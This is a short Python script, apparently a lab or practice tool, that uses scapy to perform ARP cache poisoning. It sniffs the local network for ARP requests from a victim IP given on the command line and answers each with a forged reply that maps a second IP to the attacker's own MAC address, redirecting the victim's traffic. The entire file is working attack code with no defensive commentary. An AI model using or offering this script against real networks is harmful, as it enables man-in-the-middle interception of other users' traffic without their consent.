import sys
from scapy.all import *
import uuid


def get_mac():
    mac_num = hex(uuid.getnode()).replace('x', '').upper()
    mac = ':'.join(mac_num[i:i + 2] for i in range(0, 11, 2))
    return str(mac)


host_mac = get_mac()


def capture_arp_from_69(pkt):
    if pkt.haslayer("ARP") and pkt[ARP].op == ARP.who_has and pkt[ARP].psrc == victim_ip:
        print("Poisoning ARP of " + victim_ip)
        arp_poisoning(pkt)


def arp_poisoning(pkt):
    fake_arp = Ether(src = host_mac, dst=pkt[ARP].hwsrc)/\
               ARP(hwtype=0x1,
                   ptype=0x0800,
                   hwlen=6,
                   plen=4,
                   op=2,
                   hwsrc=host_mac,
                   psrc=reach_ip,
                   hwdst=pkt[ARP].hwsrc,
                   pdst=pkt[ARP].psrc)
    fake_arp.show()
    sendp(fake_arp)

if __name__ == "__main__":
    victim_ip = sys.argv[1]
    reach_ip = sys.argv[2]
    sniff(prn=capture_arp_from_69)
